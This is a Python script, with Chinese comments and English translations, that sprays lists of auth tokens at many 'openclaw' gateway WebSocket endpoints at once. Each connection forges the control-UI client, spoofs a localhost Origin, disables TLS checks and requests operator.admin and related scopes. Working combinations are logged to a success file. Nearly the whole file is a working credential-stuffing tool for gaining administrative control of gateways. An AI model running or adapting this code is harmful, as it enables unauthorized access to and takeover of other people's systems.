import asyncio
import json
import uuid
import time
import base64
import ssl
import hashlib
import websockets
import os
from cryptography.hazmat.primitives.asymmetric import ed25519

# --- 基础工具函数 ---
# --- Basic Utility Functions ---
def base64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')

def bytes_to_hex(data: bytes) -> str:
    return data.hex()

# --- 文件读取工具 ---
# --- File Reading Utility ---
def load_file_lines(filepath):
    """
    读取文件行，忽略空行和注释
    Read file lines, ignoring empty lines and comments
    """
    if not os.path.exists(filepath):
        print(f"❌ 文件不存在: {filepath}")
        # ❌ File does not exist: {filepath}
        return []
    with open(filepath, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f if line.strip() and not line.startswith('#')]

# --- 设备身份类 ---
# --- Device Identity Class ---
class DeviceIdentity:
    def __init__(self):
        # 模拟生成 Ed25519 密钥对
        # Simulate generating Ed25519 key pair
        self.priv_obj = ed25519.Ed25519PrivateKey.generate()
        self.priv_bytes = self.priv_obj.private_bytes_raw()
        
        self.pub_obj = self.priv_obj.public_key()
        self.pub_bytes = self.pub_obj.public_bytes_raw()
        
        # SHA-256(pub) -> Hex
        # SHA-256 hash of public key converted to Hex
        sha256_hash = hashlib.sha256(self.pub_bytes).digest()
        self.device_id = bytes_to_hex(sha256_hash)
        
        self.public_key_str = base64url_encode(self.pub_bytes)

    def sign_device_payload(self, payload_str: str) -> str:
        # 对应 TypeScript: new TextEncoder().encode(payload)
        # Corresponds to TypeScript: new TextEncoder().encode(payload)
        data = payload_str.encode('utf-8')
        # 签名并进行 Base64URL 编码
        # Sign and perform Base64URL encoding
        sig = self.priv_obj.sign(data)
        return base64url_encode(sig)

# --- 核心验证逻辑 ---
# --- Core Verification Logic ---
async def verify_gateway_v2(url, auth_token, semaphore):
    """
    单个验证任务
    Single verification task
    :param url: WebSocket 目标地址 / WebSocket target address
    :param auth_token: 认证 Token / Authentication Token
    :param semaphore: 并发信号量 / Concurrency semaphore
    """
    # 限制并发数
    # Limit concurrency
    async with semaphore:  
        # 用于日志显示的简短 Token
        # Short Token for log display
        token_short = auth_token[:6] + "..." if len(auth_token) > 6 else auth_token
        log_prefix = f"[{url} | {token_short}]"

        ssl_context = None
        if url.startswith("wss://"):
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
        
        # 设置自定义 Header (Origin) - 如果需要根据 Target 变化 Origin，可在此修改
        # Set custom Header (Origin) - Modify here if Origin needs to change based on Target
        headers = {
            "Origin": "http://127.0.0.1:18789" 
        }
        
        device = DeviceIdentity()
        client_id = "openclaw-control-ui"
        client_mode = "webchat"
        role = "operator"
        scopes_list = ["operator.admin", "operator.approvals", "operator.pairing"]

        print(f"{log_prefix} 开始连接...")
        # print(f"{log_prefix} Connecting...")

        try:
            async with websockets.connect(url, ssl=ssl_context, additional_headers=headers, open_timeout=5) as ws:
                # print(f"{log_prefix} 已连接，等待挑战码 (Nonce)...")
                # print(f"{log_prefix} Connected, waiting for challenge code (Nonce)...")
                
                connect_nonce = None
                try:
                    # 监听挑战码
                    # Listen for challenge code
                    while True:
                        msg = await asyncio.wait_for(ws.recv(), timeout=5.0)
                        data = json.loads(msg)
                        if data.get("type") == "event" and data.get("event") == "connect.challenge":
                            connect_nonce = data.get("payload", {}).get("nonce")
                            # print(f"{log_prefix} 捕获 Nonce: {connect_nonce}")
                            # print(f"{log_prefix} Captured Nonce: {connect_nonce}")
                            break
                except asyncio.TimeoutError:
                    print(f"{log_prefix} ⚠️ 未收到挑战码，将尝试 v1 模式")
                    # print(f"{log_prefix} ⚠️ No challenge code received, attempting v1 mode")

                # --- 构建 Payload ---
                # --- Build Payload ---
                
                # 1. 确定版本和基础字段
                # 1. Determine version and basic fields
                version = "v2" if connect_nonce else "v1"
                scopes_str = ",".join(scopes_list)
                signed_at_ms = int(time.time() * 1000)
                
                # 2. 按照 base.join("|") 顺序排列字段
                # 2. Arrange fields in order for base.join("|")
                base_fields = [
                    version, device.device_id, client_id, client_mode, 
                    role, scopes_str, str(signed_at_ms), 
                    auth_token if auth_token else ""
                ]
                
                if version == "v2":
                    base_fields.append(connect_nonce if connect_nonce else "")
                
                # 3. 最终待签名字符串 (Payload)
                # 3. Final string to be signed (Payload)
                payload_str = "|".join(base_fields)
                
                # 4. 执行签名
                # 4. Execute signature
                signature = device.sign_device_payload(payload_str)
                
                # --- 构建发送的 JSON 报文 ---
                # --- Build the JSON message to send ---
                req_id = str(uuid.uuid4())
                connect_params = {
                    "type": "req", "id": req_id, "method": "connect",
                    "params": {
                        "minProtocol": 3, "maxProtocol": 3,
                        "client": {
                            "id": client_id, "version": "dev", 
                            "platform": "Win32", "mode": client_mode
                        },
                        "role": role, "scopes": scopes_list,
                        "device": {
                            "id": device.device_id, "publicKey": device.public_key_str,
                            "signature": signature, "signedAt": signed_at_ms,
                            "nonce": connect_nonce
                        },
                        "caps": [],
                        "auth": {"token": auth_token},
                        "userAgent": "Mozilla/5.0 (Script/Bot)",
                        "locale": "zh-CN"
                    }
                }

                # print(f"{log_prefix} 发送认证请求...")
                # print(f"{log_prefix} Sending authentication request...")
                await ws.send(json.dumps(connect_params))

                # 等待最终结果
                # Wait for final result
                resp_raw = await asyncio.wait_for(ws.recv(), timeout=5.0)
                resp_data = json.loads(resp_raw)
                
                if resp_data.get("ok"):
                    print(f"✅ 成功: {log_prefix} 登录成功！")
                    # ✅ Success: {log_prefix} Login successful!
                    
                    # 如果需要保存成功的组合，可以在这里写入文件
                    # If you need to save successful combinations, write to file here
                    with open("success_log.txt", "a") as f:
                        f.write(f"{url},{auth_token}\n")
                else:
                    error_msg = resp_data.get('error', {}).get('message', '未知错误 / Unknown Error')
                    print(f"❌ 失败: {log_prefix} 原因: {error_msg}")
                    # ❌ Failed: {log_prefix} Reason: {error_msg}

        except Exception as e:
            print(f"⚠️ 异常: {log_prefix} 连接或处理错误: {str(e)}")
            # ⚠️ Exception: {log_prefix} Connection or processing error: {str(e)}

async def main():
    # 1. 读取列表
    # 1. Read lists
    targets = load_file_lines("targets.txt")
    tokens = load_file_lines("tokens.txt")

    if not targets:
        print("没有找到目标 (targets.txt 为空或不存在)")
        # No targets found (targets.txt is empty or does not exist)
        # 默认回退方便测试
        # Default fallback for testing convenience
        targets = ["ws://127.0.0.1:18789"]
    
    if not tokens:
        print("没有找到 Token (tokens.txt 为空或不存在)")
        # No Tokens found (tokens.txt is empty or does not exist)
        return

    print(f"[*] 加载了 {len(targets)} 个目标和 {len(tokens)} 个 Token")
    # [*] Loaded {len(targets)} targets and {len(tokens)} Tokens
    print(f"[*] 总计组合任务数: {len(targets) * len(tokens)}")
    # [*] Total combined tasks: {len(targets) * len(tokens)}
    
    # 2. 限制并发数 (例如同时只允许 10 个连接)
    # 2. Limit concurrency (e.g., allow only 10 simultaneous connections)
    sem = asyncio.Semaphore(10)
    
    tasks = []
    
    # 3. 组合所有可能
    # 3. Combine all possibilities
    for url in targets:
        for token in tokens:
            task = asyncio.create_task(verify_gateway_v2(url, token, sem))
            tasks.append(task)
    
    # 4. 等待所有任务完成
    # 4. Wait for all tasks to complete
    start_time = time.time()
    await asyncio.gather(*tasks)
    end_time = time.time()
    
    print(f"\n[*] 所有任务完成，耗时: {end_time - start_time:.2f} 秒")
    # [*] All tasks completed, elapsed time: {end_time - start_time:.2f} seconds

if __name__ == "__main__":
    # 创建示例文件（如果不存在）以便首次运行不报错
    # Create example files (if they don't exist) so first run doesn't error
    if not os.path.exists("targets.txt"):
        with open("targets.txt", "w") as f:
            f.write("ws://127.0.0.1:18789\n")
            print("[!] 已自动创建 targets.txt 模板")
            # [!] Automatically created targets.txt template

    if not os.path.exists("tokens.txt"):
        with open("tokens.txt", "w") as f:
            f.write("c08f712bbc02505014beabcaffa473857f3845868366b771\n")
            print("[!] 已自动创建 tokens.txt 模板")
            # [!] Automatically created tokens.txt template

    asyncio.run(main())